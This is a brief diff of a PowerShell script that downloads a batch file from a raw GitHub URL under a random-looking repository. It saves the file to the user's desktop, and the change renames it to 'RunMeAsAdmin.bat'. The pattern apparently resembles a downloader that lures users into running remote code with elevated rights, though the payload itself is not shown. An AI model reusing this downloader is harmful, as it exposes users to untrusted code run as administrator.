@@ -5,7 +5,7 @@ $batchUrl = "https://raw.githubusercontent.com/greetjerry098-web/ahkwfjealyfusdi
 $desktopPath = [Environment]::GetFolderPath("Desktop")
 
 # Full path for the downloaded batch file
-$batchPath = Join-Path $desktopPath "script.bat"
+$batchPath = Join-Path $desktopPath "RunMeAsAdmin.bat"
 
 try {
     # Ensure TLS 1.2 (important for many HTTPS sites)
